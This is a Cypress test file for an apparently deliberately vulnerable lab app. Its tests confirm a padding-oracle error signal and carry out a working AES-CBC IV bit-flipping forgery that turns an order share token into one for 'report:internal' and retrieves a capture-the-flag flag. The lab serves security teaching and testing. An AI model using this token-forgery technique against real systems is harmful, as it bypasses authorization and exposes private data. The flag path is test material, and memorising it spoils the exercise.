describe("AES-CBC Padding Oracle (E2E)", () => {
  it("order page shows Share Order button and generates a share link", () => {
    cy.loginAsBob();
    cy.visit("/order?id=ORD-001");

    cy.contains("button", "Share Order").should("be.visible").click();

    cy.get("input[data-share-url]", { timeout: 10000 })
      .should("be.visible")
      .invoke("val")
      .should("contain", "/api/documents/share?token=");

    cy.contains("Anyone with this link can view the order details.").should(
      "be.visible"
    );
  });

  it("share link returns order data without authentication", () => {
    cy.request({
      method: "POST",
      url: "/api/auth/login",
      body: { email: "bob@example.com", password: "qwerty" },
    });

    cy.request("POST", "/api/orders/ORD-001/share").then((response) => {
      expect(response.status).to.eq(200);
      const { token } = response.body;

      cy.clearCookies();

      cy.request("GET", `/api/documents/share?token=${token}`).then(
        (shareResponse) => {
          expect(shareResponse.status).to.eq(200);
          expect(shareResponse.body.type).to.eq("order");
          expect(shareResponse.body.order.id).to.eq("ORD-001");
        }
      );
    });
  });

  it("tampered ciphertext returns 400 (padding oracle signal)", () => {
    cy.request({
      method: "POST",
      url: "/api/auth/login",
      body: { email: "bob@example.com", password: "qwerty" },
    });

    cy.request("POST", "/api/orders/ORD-001/share").then((response) => {
      const { token } = response.body;

      // Flip last byte of ciphertext
      const bytes = Cypress.Buffer.from(token, "hex");
      bytes[bytes.length - 1] ^= 0x01;
      const tampered = bytes.toString("hex");

      cy.request({
        url: `/api/documents/share?token=${tampered}`,
        failOnStatusCode: false,
      }).then((res) => {
        expect(res.status).to.eq(400);
        expect(res.body.error).to.eq("Invalid share token format");
      });
    });
  });

  it("unknown resource type leaks supported types", () => {
    cy.request({
      method: "POST",
      url: "/api/auth/login",
      body: { email: "bob@example.com", password: "qwerty" },
    });

    cy.request("POST", "/api/orders/ORD-001/share").then((response) => {
      const { token } = response.body;
      const bytes = Cypress.Buffer.from(token, "hex");
      const iv = bytes.subarray(0, 16);
      const cipherBlock = bytes.subarray(16, 32);

      const knownPlaintext = Cypress.Buffer.from("order:ORD-001\x03\x03\x03");
      const intermediate = Cypress.Buffer.alloc(16);
      for (let i = 0; i < 16; i++) {
        intermediate[i] = iv[i] ^ knownPlaintext[i];
      }

      const target = Cypress.Buffer.from("zzzzz:test\x06\x06\x06\x06\x06\x06");
      const newIv = Cypress.Buffer.alloc(16);
      for (let i = 0; i < 16; i++) {
        newIv[i] = intermediate[i] ^ target[i];
      }
      const forged = Cypress.Buffer.concat([newIv, cipherBlock]).toString(
        "hex"
      );

      cy.request({
        url: `/api/documents/share?token=${forged}`,
        failOnStatusCode: false,
      }).then((res) => {
        expect(res.status).to.eq(400);
        expect(res.body.error).to.contain("Unsupported resource type");
        expect(res.body.error).to.contain("report");
      });
    });
  });

  it("forged token for report:internal returns flag", () => {
    cy.request({
      method: "POST",
      url: "/api/auth/login",
      body: { email: "bob@example.com", password: "qwerty" },
    });

    cy.request("POST", "/api/orders/ORD-001/share").then((response) => {
      const { token } = response.body;
      const bytes = Cypress.Buffer.from(token, "hex");
      const iv = bytes.subarray(0, 16);
      const cipherBlock = bytes.subarray(16, 32);

      const knownPlaintext = Cypress.Buffer.from("order:ORD-001\x03\x03\x03");
      const intermediate = Cypress.Buffer.alloc(16);
      for (let i = 0; i < 16; i++) {
        intermediate[i] = iv[i] ^ knownPlaintext[i];
      }

      const target = Cypress.Buffer.from("report:internal\x01");
      const newIv = Cypress.Buffer.alloc(16);
      for (let i = 0; i < 16; i++) {
        newIv[i] = intermediate[i] ^ target[i];
      }
      const forged = Cypress.Buffer.concat([newIv, cipherBlock]).toString(
        "hex"
      );

      cy.request(`/api/documents/share?token=${forged}`).then((res) => {
        expect(res.status).to.eq(200);
        expect(res.body.type).to.eq("report");
        expect(res.body.flag)
          .to.be.a("string")
          .and.match(/^OSS\{/);

        cy.verifyFlag(res.body.flag);
      });
    });
  });
});
